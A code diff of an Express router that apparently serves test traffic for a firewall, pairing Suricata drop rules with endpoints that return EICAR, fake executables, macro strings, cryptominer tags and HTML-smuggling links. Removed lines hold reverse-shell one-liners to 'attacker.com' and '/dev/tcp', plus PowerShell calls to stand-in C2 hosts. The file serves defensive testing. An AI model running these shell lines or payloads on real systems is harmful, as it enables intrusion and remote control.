@@ -4,566 +4,501 @@ const express = require('express');
 const router = express.Router();
 
 // ============================================
-// EICAR TEST STRING (68 bytes)
+// 30 TEST CASES FROM REAL SURICATA RULES
+// Source: et-virus_protection.rules & et-malware_protection.rules.txt
 // ============================================
-const EICAR_STRING = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
 
-// ============================================
-// TEST CASES CONFIG - 20 Important Rules
-// SID Range: 5900006 - 6400033
-// ============================================
 const TEST_CASES = [
-    // === MALWARE & VIRUS DETECTION ===
+    // ========== EICAR MALWARE TESTS (from et-malware_protection.rules.txt) ==========
     {
         id: 1,
         sid: '5900006',
-        name: 'EICAR Test File Detection',
-        category: 'Malware',
-        description: 'Standard antivirus test file - EICAR pattern detection via HTTP download',
-        endpoint: '/eicar.com',
-        method: 'GET',
-        expectedAction: 'BLOCK',
+        name: 'EICAR Test File - HTTP Download',
+        category: 'MALWARE',
+        rule: 'drop http $EXTERNAL_NET any -> $HOME_NET any (msg:"MALWARE EICAR Test File - HTTP Download Blocked"; flow:established,to_client; file_data; content:"X5O!P%@AP[4|5C|PZX54(P^)7CC)7}|24|EICAR"; nocase; fast_pattern; classtype:trojan-activity; sid:5900006; rev:1;)',
+        endpoint: '/test/5900006',
         severity: 'HIGH'
     },
     {
         id: 2,
-        sid: '5900007',
-        name: 'EICAR in ZIP Archive',
-        category: 'Malware',
-        description: 'EICAR test file embedded in ZIP archive - tests archive inspection',
-        endpoint: '/eicar.zip',
-        method: 'GET',
-        expectedAction: 'BLOCK',
+        sid: '5900012',
+        name: 'Suspicious EXE Download',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE Suspicious EXE Download"; flow:established,to_client; file_data; content:"MZ"; depth:2; classtype:trojan-activity; sid:5900012; rev:2;)',
+        endpoint: '/test/5900012',
         severity: 'HIGH'
     },
     {
         id: 3,
-        sid: '5900008',
-        name: 'EICAR Base64 Encoded',
-        category: 'Malware',
-        description: 'EICAR test file with Base64 encoding - tests decoding capability',
-        endpoint: '/eicar-b64',
-        method: 'GET',
-        expectedAction: 'BLOCK',
+        sid: '5900014',
+        name: 'Macro-Enabled Document Download',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE Macro-Enabled Document Download"; flow:established,to_client; file_data; content:"PK"; depth:2; classtype:trojan-activity; sid:5900014; rev:2;)',
+        endpoint: '/test/5900014',
         severity: 'HIGH'
     },
-
-    // === EXECUTABLE & SUSPICIOUS FILE DOWNLOADS ===
     {
         id: 4,
-        sid: '6100001',
-        name: 'EXE File Download via HTTP',
-        category: 'Suspicious File',
-        description: 'Windows executable download over unencrypted HTTP - potential malware delivery',
-        endpoint: '/download/test.exe',
-        method: 'GET',
-        expectedAction: 'ALERT/BLOCK',
-        severity: 'MEDIUM'
+        sid: '5900015',
+        name: 'Windows Script File Download',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE Windows Script File Download"; flow:established,to_client; file_data; content:"WScript"; nocase; classtype:trojan-activity; sid:5900015; rev:2;)',
+        endpoint: '/test/5900015',
+        severity: 'HIGH'
     },
     {
         id: 5,
-        sid: '6100002',
-        name: 'DLL File Download',
-        category: 'Suspicious File',
-        description: 'Dynamic Link Library download - often used in DLL hijacking attacks',
-        endpoint: '/download/test.dll',
-        method: 'GET',
-        expectedAction: 'ALERT/BLOCK',
-        severity: 'MEDIUM'
+        sid: '5900016',
+        name: 'PE Executable Downloaded',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE PE Executable Downloaded"; flow:established,to_client; file_data; content:"MZ"; depth:2; content:"PE|00 00|"; distance:0; within:200; classtype:trojan-activity; sid:5900016; rev:1;)',
+        endpoint: '/test/5900016',
+        severity: 'CRITICAL'
     },
     {
         id: 6,
-        sid: '6100003',
-        name: 'SCR (Screensaver) Download',
-        category: 'Suspicious File',
-        description: 'Screensaver file download - commonly used to disguise malware',
-        endpoint: '/download/test.scr',
-        method: 'GET',
-        expectedAction: 'ALERT/BLOCK',
-        severity: 'HIGH'
+        sid: '5900029',
+        name: 'Coinhive Cryptominer',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE Coinhive Cryptominer"; flow:established; content:"coinhive"; nocase; classtype:trojan-activity; sid:5900029; rev:1;)',
+        endpoint: '/test/5900029',
+        severity: 'MEDIUM'
     },
     {
         id: 7,
-        sid: '6100004',
-        name: 'BAT/CMD Script Download',
-        category: 'Suspicious File',
-        description: 'Batch script download - can execute arbitrary commands',
-        endpoint: '/download/test.bat',
-        method: 'GET',
-        expectedAction: 'ALERT/BLOCK',
-        severity: 'HIGH'
+        sid: '5900032',
+        name: 'CryptoLoot Miner',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE CryptoLoot Miner"; flow:established; content:"crypto-loot"; nocase; classtype:trojan-activity; sid:5900032; rev:1;)',
+        endpoint: '/test/5900032',
+        severity: 'MEDIUM'
     },
     {
         id: 8,
-        sid: '6100005',
-        name: 'PowerShell Script Download',
-        category: 'Suspicious File',
-        description: 'PS1 script download - commonly used in fileless malware attacks',
-        endpoint: '/download/test.ps1',
-        method: 'GET',
-        expectedAction: 'ALERT/BLOCK',
-        severity: 'HIGH'
+        sid: '5900035',
+        name: 'JSECoin Miner',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE JSECoin Miner"; flow:established; content:"jsecoin"; nocase; classtype:trojan-activity; sid:5900035; rev:1;)',
+        endpoint: '/test/5900035',
+        severity: 'MEDIUM'
     },
-
-    // === WEB APPLICATION ATTACKS ===
     {
         id: 9,
-        sid: '6200001',
-        name: 'SQL Injection Pattern in Response',
-        category: 'Web Attack',
-        description: 'Server response containing SQL error messages - indicates SQLi vulnerability',
-        endpoint: '/vuln/sqli-error',
-        method: 'GET',
-        expectedAction: 'ALERT',
+        sid: '5900044',
+        name: 'RIG Exploit Kit Landing Page',
+        category: 'EXPLOIT-KIT',
+        rule: 'drop http any any -> any any (msg:"MALWARE RIG Exploit Kit Landing Page"; flow:established; http.uri; pcre:"/\\/[a-z]{8}\\.html$/"; file_data; content:"iframe"; nocase; classtype:trojan-activity; sid:5900044; rev:1;)',
+        endpoint: '/test/5900044',
         severity: 'HIGH'
     },
     {
         id: 10,
-        sid: '6200002',
-        name: 'XSS Pattern in Response',
-        category: 'Web Attack',
-        description: 'Cross-Site Scripting pattern in HTTP response',
-        endpoint: '/vuln/xss-reflect',
-        method: 'GET',
-        expectedAction: 'ALERT',
-        severity: 'MEDIUM'
+        sid: '5900045',
+        name: 'Fallout Exploit Kit',
+        category: 'EXPLOIT-KIT',
+        rule: 'drop http any any -> any any (msg:"MALWARE Fallout Exploit Kit"; flow:established; file_data; content:"FWS"; depth:3; classtype:trojan-activity; sid:5900045; rev:2;)',
+        endpoint: '/test/5900045',
+        severity: 'HIGH'
     },
     {
         id: 11,
-        sid: '6200003',
-        name: 'Directory Traversal Pattern',
-        category: 'Web Attack',
-        description: 'Path traversal sequences in response - potential LFI vulnerability',
-        endpoint: '/vuln/path-traversal',
-        method: 'GET',
-        expectedAction: 'ALERT',
+        sid: '5900048',
+        name: 'Suspicious ZIP with EXE',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE Suspicious ZIP Download"; flow:established,to_client; file_data; content:"PK|03 04|"; depth:4; content:".exe"; nocase; distance:0; classtype:trojan-activity; sid:5900048; rev:1;)',
+        endpoint: '/test/5900048',
         severity: 'HIGH'
     },
     {
         id: 12,
-        sid: '6200004',
-        name: 'Command Injection Pattern',
-        category: 'Web Attack',
-        description: 'Shell command output in response - indicates RCE vulnerability',
-        endpoint: '/vuln/cmd-injection',
-        method: 'GET',
-        expectedAction: 'ALERT',
+        sid: '5900049',
+        name: 'HTML Smuggling Base64 Payload',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"MALWARE HTML Smuggling - Base64 Encoded Payload"; flow:established,to_client; file_data; content:"data|3a|application/octet-stream|3b|base64"; nocase; classtype:trojan-activity; sid:5900049; rev:2;)',
+        endpoint: '/test/5900049',
         severity: 'CRITICAL'
     },
-
-    // === SENSITIVE DATA EXPOSURE ===
     {
         id: 13,
-        sid: '6300001',
-        name: 'Credit Card Number in Response',
-        category: 'Data Leak',
-        description: 'Credit card pattern detected in HTTP response - PCI-DSS violation',
-        endpoint: '/leak/credit-card',
-        method: 'GET',
-        expectedAction: 'ALERT',
-        severity: 'CRITICAL'
+        sid: '5900063',
+        name: 'VirtualBox Detection Query',
+        category: 'ANTI-SANDBOX',
+        rule: 'drop http any any -> any any (msg:"MALWARE VirtualBox Detection Query"; flow:established; content:"VBoxService"; nocase; classtype:trojan-activity; sid:5900063; rev:1;)',
+        endpoint: '/test/5900063',
+        severity: 'MEDIUM'
     },
     {
         id: 14,
-        sid: '6300002',
-        name: 'SSN Pattern in Response',
-        category: 'Data Leak',
-        description: 'Social Security Number pattern in response - PII exposure',
-        endpoint: '/leak/ssn',
-        method: 'GET',
-        expectedAction: 'ALERT',
-        severity: 'CRITICAL'
+        sid: '5900064',
+        name: 'VMware Detection Query',
+        category: 'ANTI-SANDBOX',
+        rule: 'drop http any any -> any any (msg:"MALWARE VMware Detection Query"; flow:established; content:"vmtoolsd"; nocase; classtype:trojan-activity; sid:5900064; rev:1;)',
+        endpoint: '/test/5900064',
+        severity: 'MEDIUM'
     },
     {
         id: 15,
-        sid: '6300003',
-        name: 'Private Key Exposure',
-        category: 'Data Leak',
-        description: 'RSA/SSH private key in HTTP response - critical security breach',
-        endpoint: '/leak/private-key',
-        method: 'GET',
-        expectedAction: 'ALERT/BLOCK',
-        severity: 'CRITICAL'
-    },
-    {
-        id: 16,
-        sid: '6300004',
-        name: 'Password Hash Exposure',
-        category: 'Data Leak',
-        description: 'Password hashes (MD5/SHA) in response - credential theft risk',
-        endpoint: '/leak/password-hash',
-        method: 'GET',
-        expectedAction: 'ALERT',
+        sid: '5900070',
+        name: 'EICAR Attachment Header',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"EICAR Blocked - Attachment Header (Dual-Stack)"; flow:established,to_client; http.header; content:"Content-Disposition"; nocase; content:"filename"; nocase; distance:0; within:50; content:"eicar"; nocase; distance:0; classtype:trojan-activity; sid:5900070; rev:1;)',
+        endpoint: '/test/5900070',
         severity: 'HIGH'
     },
-
-    // === C2 & SUSPICIOUS PATTERNS ===
+    
+    // ========== VIRUS TESTS (from et-virus_protection.rules) ==========
+    {
+        id: 16,
+        sid: '6400000',
+        name: 'PE File with Auto-Run',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Suspicious PE File with Auto-Run"; flow:established,to_client; file_data; content:"MZ"; depth:2; content:"autorun"; nocase; distance:0; classtype:trojan-activity; sid:6400000; rev:1;)',
+        endpoint: '/test/6400000',
+        severity: 'HIGH'
+    },
     {
         id: 17,
         sid: '6400001',
-        name: 'Suspicious User-Agent Response',
-        category: 'C2/Malware',
-        description: 'Response to known malicious user-agent patterns',
-        endpoint: '/c2/user-agent',
-        method: 'GET',
-        expectedAction: 'ALERT',
+        name: 'Office Macro Shell Execute',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Office Macro with Shell Execute"; flow:established,to_client; file_data; content:"Shell"; nocase; content:"Execute"; nocase; distance:0; classtype:trojan-activity; sid:6400001; rev:2;)',
+        endpoint: '/test/6400001',
         severity: 'HIGH'
     },
     {
         id: 18,
         sid: '6400002',
-        name: 'Base64 Encoded Payload',
-        category: 'C2/Malware',
-        description: 'Large Base64 encoded data in response - possible C2 communication',
-        endpoint: '/c2/b64-payload',
-        method: 'GET',
-        expectedAction: 'ALERT',
-        severity: 'MEDIUM'
+        name: 'Word Macro AutoOpen',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Word Macro Auto-Execute"; flow:established,to_client; file_data; content:"AutoOpen"; nocase; classtype:trojan-activity; sid:6400002; rev:2;)',
+        endpoint: '/test/6400002',
+        severity: 'HIGH'
     },
     {
         id: 19,
         sid: '6400003',
-        name: 'Hex Encoded Shellcode Pattern',
-        category: 'C2/Malware',
-        description: 'Hexadecimal shellcode pattern in HTTP response',
-        endpoint: '/c2/shellcode',
-        method: 'GET',
-        expectedAction: 'BLOCK',
-        severity: 'CRITICAL'
+        name: 'Excel Macro Auto_Open',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Excel Macro Auto-Execute"; flow:established,to_client; file_data; content:"Auto_Open"; nocase; classtype:trojan-activity; sid:6400003; rev:2;)',
+        endpoint: '/test/6400003',
+        severity: 'HIGH'
     },
     {
         id: 20,
-        sid: '6400033',
-        name: 'Webshell Detection Pattern',
-        category: 'C2/Malware',
-        description: 'PHP/ASP webshell patterns in response - server compromise indicator',
-        endpoint: '/c2/webshell',
-        method: 'GET',
-        expectedAction: 'BLOCK',
+        sid: '6400007',
+        name: 'Macro CreateObject',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Macro-Enabled Document with Suspicious Content"; flow:established,to_client; file_data; content:"CreateObject"; nocase; classtype:trojan-activity; sid:6400007; rev:2;)',
+        endpoint: '/test/6400007',
+        severity: 'HIGH'
+    },
+    {
+        id: 21,
+        sid: '6400011',
+        name: 'VBScript Self-Replication',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS VBScript Self-Replication"; flow:established,to_client; file_data; content:"WScript.Shell"; nocase; content:"CopyFile"; nocase; distance:0; classtype:trojan-activity; sid:6400011; rev:2;)',
+        endpoint: '/test/6400011',
         severity: 'CRITICAL'
+    },
+    {
+        id: 22,
+        sid: '6400012',
+        name: 'JavaScript FileSystem Access',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS JavaScript File System Access"; flow:established,to_client; file_data; content:"ActiveXObject"; nocase; content:"Scripting.FileSystemObject"; nocase; distance:0; classtype:trojan-activity; sid:6400012; rev:2;)',
+        endpoint: '/test/6400012',
+        severity: 'CRITICAL'
+    },
+    {
+        id: 23,
+        sid: '6400013',
+        name: 'Batch File Self-Replication',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Batch File Self-Replication"; flow:established,to_client; file_data; content:"copy"; nocase; content:"%0"; nocase; distance:0; classtype:trojan-activity; sid:6400013; rev:2;)',
+        endpoint: '/test/6400013',
+        severity: 'HIGH'
+    },
+    {
+        id: 24,
+        sid: '6400020',
+        name: 'Java Malicious Class File',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS Java Malicious Class File"; flow:established,to_client; file_data; content:"|CA FE BA BE|"; depth:4; classtype:trojan-activity; sid:6400020; rev:2;)',
+        endpoint: '/test/6400020',
+        severity: 'HIGH'
+    },
+    {
+        id: 25,
+        sid: '6400021',
+        name: 'PDF with Malicious JavaScript',
+        category: 'VIRUS',
+        rule: 'drop http any any -> any any (msg:"VIRUS PDF with Malicious JavaScript"; flow:established,to_client; file_data; content:"/JS"; nocase; content:"/JavaScript"; nocase; distance:0; classtype:trojan-activity; sid:6400021; rev:2;)',
+        endpoint: '/test/6400021',
+        severity: 'CRITICAL'
+    },
+    {
+        id: 26,
+        sid: '6400026',
+        name: 'SQL Injection SELECT',
+        category: 'WEB-ATTACK',
+        rule: 'drop http any any -> $HTTP_SERVERS any (msg:"ET WEB_SPECIFIC_APPS SQL Injection Attempt -- SELECT"; flow:established,to_server; http.uri; content:"currentpage="; nocase; content:"SELECT"; nocase; content:"FROM"; nocase; distance:0; classtype:web-application-attack; sid:6400026; rev:9;)',
+        endpoint: '/test/6400026',
+        severity: 'HIGH'
+    },
+    {
+        id: 27,
+        sid: '6400027',
+        name: 'SQL Injection UNION SELECT',
+        category: 'WEB-ATTACK',
+        rule: 'drop http any any -> $HTTP_SERVERS any (msg:"ET WEB_SPECIFIC_APPS SQL Injection Attempt -- UNION SELECT"; flow:established,to_server; http.uri; content:"currentpage="; nocase; content:"UNION"; nocase; content:"SELECT"; nocase; distance:0; classtype:web-application-attack; sid:6400027; rev:9;)',
+        endpoint: '/test/6400027',
+        severity: 'HIGH'
+    },
+    {
+        id: 28,
+        sid: '6400028',
+        name: 'SQL Injection INSERT',
+        category: 'WEB-ATTACK',
+        rule: 'drop http any any -> $HTTP_SERVERS any (msg:"ET WEB_SPECIFIC_APPS SQL Injection Attempt -- INSERT"; flow:established,to_server; http.uri; content:"currentpage="; nocase; content:"INSERT"; nocase; content:"INTO"; nocase; distance:0; classtype:web-application-attack; sid:6400028; rev:8;)',
+        endpoint: '/test/6400028',
+        severity: 'HIGH'
+    },
+    {
+        id: 29,
+        sid: '6400032',
+        name: 'Cool Java Exploit Kit',
+        category: 'EXPLOIT-KIT',
+        rule: 'drop http any any -> any any (msg:"ET EXPLOIT_KIT Cool Java Exploit Recent Jar (1)"; flow:established,to_client; flowbits:set,et.exploitkitlanding; file.data; content:"PK"; within:2; content:"SunJCE.class"; classtype:exploit-kit; sid:6400032; rev:5;)',
+        endpoint: '/test/6400032',
+        severity: 'CRITICAL'
+    },
+    {
+        id: 30,
+        sid: '6400033',
+        name: 'Suspicious EXE from File Share',
+        category: 'MALWARE',
+        rule: 'drop http any any -> any any (msg:"ET HUNTING SUSPICIOUS EXE Download from specific file share site"; flow:established,to_server; http.uri; content:".exe"; http.host; bsize:10; content:"a.pomf.cat"; fast_pattern; classtype:trojan-activity; sid:6400033; rev:6;)',
+        endpoint: '/test/6400033',
+        severity: 'HIGH'
     }
 ];
 
 // ============================================
-// API: Get all test cases info
+// EICAR TEST STRING
+// ============================================
+const EICAR_STRING = 'X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*';
+
+// ============================================
+// API: Get all test cases
 // ============================================
 router.get('/api/test-cases', (req, res) => {
     res.json({
         total: TEST_CASES.length,
-        sidRange: '5900006 - 6400033',
+        source: 'et-virus_protection.rules & et-malware_protection.rules.txt',
         testCases: TEST_CASES
     });
 });
 
 // ============================================
-// EICAR TEST ENDPOINTS (1-3)
+// TEST ENDPOINTS
 // ============================================
-router.get('/eicar.com', (req, res) => {
-    res.set({
-        'Content-Type': 'application/octet-stream',
-        'Content-Disposition': 'attachment; filename="eicar.com"',
-        'X-Test-SID': '5900006'
-    });
+
+// SID 5900006 - EICAR Test File
+router.get('/test/5900006', (req, res) => {
+    res.set({ 'Content-Type': 'application/octet-stream', 'X-Test-SID': '5900006' });
     res.send(EICAR_STRING);
 });
 
-router.get('/eicar.zip', (req, res) => {
-    // Simple ZIP with EICAR (PK header + EICAR)
-    const zipHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04, 0x0A, 0x00, 0x00, 0x00, 0x00, 0x00]);
-    const eicarBuffer = Buffer.from(EICAR_STRING);
-    const combined = Buffer.concat([zipHeader, eicarBuffer]);
-    
-    res.set({
-        'Content-Type': 'application/zip',
-        'Content-Disposition': 'attachment; filename="eicar.zip"',
-        'X-Test-SID': '5900007'
-    });
-    res.send(combined);
+// SID 5900012 - Suspicious EXE (MZ header)
+router.get('/test/5900012', (req, res) => {
+    const mzHeader = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00]);
+    res.set({ 'Content-Type': 'application/octet-stream', 'Content-Disposition': 'attachment; filename="test.exe"', 'X-Test-SID': '5900012' });
+    res.send(Buffer.concat([mzHeader, Buffer.from('NGFW Test EXE Download')]));
 });
 
-router.get('/eicar-b64', (req, res) => {
-    const b64Eicar = Buffer.from(EICAR_STRING).toString('base64');
-    res.set({
-        'Content-Type': 'text/plain',
-        'X-Test-SID': '5900008'
-    });
-    res.send(b64Eicar);
+// SID 5900014 - Macro-Enabled Document (PK header = ZIP/DOCX)
+router.get('/test/5900014', (req, res) => {
+    const pkHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04]);
+    res.set({ 'Content-Type': 'application/vnd.ms-excel.sheet.macroEnabled.12', 'Content-Disposition': 'attachment; filename="test.xlsm"', 'X-Test-SID': '5900014' });
+    res.send(Buffer.concat([pkHeader, Buffer.from('Macro Document Test')]));
 });
 
-// ============================================
-// SUSPICIOUS FILE DOWNLOADS (4-8)
-// ============================================
-const createFakeExe = () => {
-    // MZ header (DOS executable signature) + padding
-    const mzHeader = Buffer.from([0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00]);
-    const padding = Buffer.alloc(100, 0x90); // NOP sled
-    return Buffer.concat([mzHeader, padding, Buffer.from('This is a test executable for NGFW testing')]);
-};
-
-router.get('/download/test.exe', (req, res) => {
-    res.set({
-        'Content-Type': 'application/x-msdownload',
-        'Content-Disposition': 'attachment; filename="test.exe"',
-        'X-Test-SID': '6100001'
-    });
-    res.send(createFakeExe());
+// SID 5900015 - Windows Script File
+router.get('/test/5900015', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'Content-Disposition': 'attachment; filename="test.vbs"', 'X-Test-SID': '5900015' });
+    res.send('Set objShell = WScript.CreateObject("WScript.Shell")\nobjShell.Run "cmd.exe"');
 });
 
-router.get('/download/test.dll', (req, res) => {
-    res.set({
-        'Content-Type': 'application/x-msdownload',
-        'Content-Disposition': 'attachment; filename="test.dll"',
-        'X-Test-SID': '6100002'
-    });
-    res.send(createFakeExe());
+// SID 5900016 - PE Executable (MZ + PE header)
+router.get('/test/5900016', (req, res) => {
+    const mzHeader = Buffer.from([0x4D, 0x5A]);
+    const padding = Buffer.alloc(58, 0x00);
+    const peHeader = Buffer.from([0x50, 0x45, 0x00, 0x00]);
+    res.set({ 'Content-Type': 'application/x-msdownload', 'Content-Disposition': 'attachment; filename="malware.exe"', 'X-Test-SID': '5900016' });
+    res.send(Buffer.concat([mzHeader, padding, peHeader, Buffer.from('PE Executable Test')]));
 });
 
-router.get('/download/test.scr', (req, res) => {
-    res.set({
-        'Content-Type': 'application/x-msdownload',
-        'Content-Disposition': 'attachment; filename="test.scr"',
-        'X-Test-SID': '6100003'
-    });
-    res.send(createFakeExe());
+// SID 5900029 - Coinhive Cryptominer
+router.get('/test/5900029', (req, res) => {
+    res.set({ 'Content-Type': 'text/html', 'X-Test-SID': '5900029' });
+    res.send('<html><script src="https://coinhive.com/lib/coinhive.min.js"></script><script>var miner = new CoinHive.Anonymous("site-key");</script></html>');
 });
 
-router.get('/download/test.bat', (req, res) => {
-    const batContent = `@echo off
-REM Test batch file for NGFW testing
-echo NGFW_TEST_BATCH_SCRIPT
-net user
-ipconfig /all
-whoami
-`;
-    res.set({
-        'Content-Type': 'application/x-bat',
-        'Content-Disposition': 'attachment; filename="test.bat"',
-        'X-Test-SID': '6100004'
-    });
-    res.send(batContent);
+// SID 5900032 - CryptoLoot Miner
+router.get('/test/5900032', (req, res) => {
+    res.set({ 'Content-Type': 'text/html', 'X-Test-SID': '5900032' });
+    res.send('<html><script src="https://crypto-loot.com/lib/miner.min.js"></script></html>');
 });
 
-router.get('/download/test.ps1', (req, res) => {
-    const ps1Content = `# PowerShell test script for NGFW testing
-$ExecutionContext.SessionState.LanguageMode
-Get-Process
-Invoke-WebRequest -Uri "http://malicious.example.com/payload"
-Invoke-Expression "whoami"
-[System.Net.WebClient]::new().DownloadString("http://c2.example.com")
-`;
-    res.set({
-        'Content-Type': 'application/x-powershell',
-        'Content-Disposition': 'attachment; filename="test.ps1"',
-        'X-Test-SID': '6100005'
-    });
-    res.send(ps1Content);
+// SID 5900035 - JSECoin Miner
+router.get('/test/5900035', (req, res) => {
+    res.set({ 'Content-Type': 'text/html', 'X-Test-SID': '5900035' });
+    res.send('<html><script src="https://jsecoin.com/api/jsecoin.min.js"></script></html>');
 });
 
-// ============================================
-// WEB ATTACK PATTERNS (9-12)
-// ============================================
-router.get('/vuln/sqli-error', (req, res) => {
-    res.set('X-Test-SID', '6200001');
-    res.send(`
-        <html><body>
-        <h1>Database Error</h1>
-        <p>Error: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version</p>
-        <pre>mysql_query(): SELECT * FROM users WHERE id = '1' OR '1'='1'</pre>
-        <p>Warning: mysql_fetch_array() expects parameter 1 to be resource</p>
-        <p>SQLSTATE[42000]: Syntax error or access violation</p>
-        </body></html>
-    `);
+// SID 5900044 - RIG Exploit Kit Landing Page
+router.get('/test/5900044', (req, res) => {
+    res.set({ 'Content-Type': 'text/html', 'X-Test-SID': '5900044' });
+    res.send('<html><iframe src="exploit.html" style="display:none"></iframe><iframe src="payload.jar"></iframe></html>');
 });
 
-router.get('/vuln/xss-reflect', (req, res) => {
-    const payload = req.query.q || '<script>alert("XSS")</script>';
-    res.set('X-Test-SID', '6200002');
-    res.send(`
-        <html><body>
-        <h1>Search Results</h1>
-        <p>You searched for: ${payload}</p>
-        <script>document.write('<img src=x onerror=alert(document.cookie)>')</script>
-        <img src="javascript:alert('XSS')">
-        <body onload="alert('XSS')">
-        </body></html>
-    `);
+// SID 5900045 - Fallout Exploit Kit (FWS = Flash header)
+router.get('/test/5900045', (req, res) => {
+    const fwsHeader = Buffer.from([0x46, 0x57, 0x53]); // FWS
+    res.set({ 'Content-Type': 'application/x-shockwave-flash', 'Content-Disposition': 'attachment; filename="exploit.swf"', 'X-Test-SID': '5900045' });
+    res.send(Buffer.concat([fwsHeader, Buffer.from(' Fallout Exploit Kit')]));
 });
 
-router.get('/vuln/path-traversal', (req, res) => {
-    res.set('X-Test-SID', '6200003');
-    res.send(`
-        File content from: ../../../etc/passwd
-        
-        root:x:0:0:root:/root:/bin/bash
-        daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-        bin:x:2:2:bin:/bin:/usr/sbin/nologin
-        sys:x:3:3:sys:/dev:/usr/sbin/nologin
-        www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-        
-        File: ....//....//....//windows/system32/config/sam
-        File: ..\\..\\..\\windows\\system.ini
-    `);
+// SID 5900048 - Suspicious ZIP with EXE
+router.get('/test/5900048', (req, res) => {
+    const pkHeader = Buffer.from([0x50, 0x4B, 0x03, 0x04]);
+    res.set({ 'Content-Type': 'application/zip', 'Content-Disposition': 'attachment; filename="malware.zip"', 'X-Test-SID': '5900048' });
+    res.send(Buffer.concat([pkHeader, Buffer.from('filename.exe inside this archive')]));
 });
 
-router.get('/vuln/cmd-injection', (req, res) => {
-    res.set('X-Test-SID', '6200004');
-    res.send(`
-        Command output:
-        $ whoami
-        root
-        
-        $ cat /etc/shadow
-        root:$6$xyz:18000:0:99999:7:::
-        
-        $ nc -e /bin/sh attacker.com 4444
-        $ bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
-        $ python -c 'import socket,subprocess,os;s=socket.socket()'
-    `);
+// SID 5900049 - HTML Smuggling Base64
+router.get('/test/5900049', (req, res) => {
+    res.set({ 'Content-Type': 'text/html', 'X-Test-SID': '5900049' });
+    res.send('<html><a download="payload.exe" href="data:application/octet-stream;base64,TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAA">Download</a></html>');
 });
 
-// ============================================
-// DATA LEAK PATTERNS (13-16)
-// ============================================
-router.get('/leak/credit-card', (req, res) => {
-    res.set('X-Test-SID', '6300001');
-    res.json({
-        message: 'Customer payment info (TEST DATA)',
-        cards: [
-            { number: '4111-1111-1111-1111', cvv: '123', expiry: '12/25' },
-            { number: '5500 0000 0000 0004', cvv: '456', expiry: '06/26' },
-            { number: '3400 000000 00009', cvv: '7890', expiry: '03/27' }
-        ]
-    });
+// SID 5900063 - VirtualBox Detection
+router.get('/test/5900063', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '5900063' });
+    res.send('Checking for VBoxService.exe process...\nVBoxService detected - VM environment');
 });
 
-router.get('/leak/ssn', (req, res) => {
-    res.set('X-Test-SID', '6300002');
-    res.json({
-        message: 'Employee records (TEST DATA)',
-        employees: [
-            { name: 'John Doe', ssn: '123-45-6789' },
-            { name: 'Jane Smith', ssn: '987-65-4321' },
-            { name: 'Bob Wilson', ssn: '456-78-9012' }
-        ]
-    });
+// SID 5900064 - VMware Detection
+router.get('/test/5900064', (req, res) => {
+    res.set({ 'Content-Type': 'text/plain', 'X-Test-SID': '5900064' });
+    res.send('Checking for vmtoolsd.exe process...\nvmtoolsd detected - VMware environment');
 });
 
-router.get('/leak/private-key', (req, res) => {
-    res.set('X-Test-SID', '6300003');
-    res.type('text/plain').send(`
------BEGIN RSA PRIVATE KEY-----
-MIIEowIBAAKCAQEA0Z3VS5JJcds3xfn/ygWyF8PbnGy0AHB7MZs0NR1BQmWAALVN
-NGxPM0NRq3o2C1WKwVzXG5qR7VLwKPyF5m5qR7VLwKPyF5m5qR7VLwKPyF5m5qR7
-THISISAFAKEPRIVATEKEYFORTESTINGPURPOSESONLY1234567890ABCDEF
-NGFWTESTPRIVATEKEYEXPOSUREDETECTION0987654321ZYXWVUTSRQPONM
------END RSA PRIVATE KEY-----
-
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAlwAAAAdzc2gtcn
-TESTKEYTESTKEYTESTKEYTESTKEYTESTKEYTESTKEYTESTKEY
------END OPENSSH PRIVATE KEY-----
-    `);
+// SID 5900070 - EICAR Attachment Header
+router.get('/test/5900070', (req, res) => {
+    res.set({ 'Content-Type': 'application/octet-stream', 'Content-Disposition': 'attachment; filename="eicar.com"', 'X-Test-SID': '5900070' });
+    res.send(EICAR_STRING);
 });
 
-router.get('/leak/password-hash', (req, res) => {
-    res.set('X-Test-SID', '6300004');
-    res.json({
-        message: 'Exposed password hashes (TEST DATA)',
-        hashes: [
